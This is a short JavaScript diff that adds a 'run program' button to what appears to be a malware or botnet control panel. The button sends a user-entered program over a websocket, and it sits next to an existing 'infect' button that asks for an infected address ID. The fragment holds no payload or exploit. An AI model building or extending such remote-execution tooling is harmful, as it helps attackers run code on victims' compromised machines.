@@ -147,6 +147,13 @@ document.getElementById("runCodeBtn").addEventListener("click", () => {
         }
     })
 })
+document.getElementById("runProgramBtn").addEventListener("click", () => {
+    utils.ask("Program:", "...").then(function (answer) {
+        if (answer) {
+            wsend("runProgram", answer)
+        }
+    })
+})
 document.getElementById("infectBtn").addEventListener("click", () => {
     utils.ask("Infected Address ID:", "...").then(function (answer) {
         if (answer) {
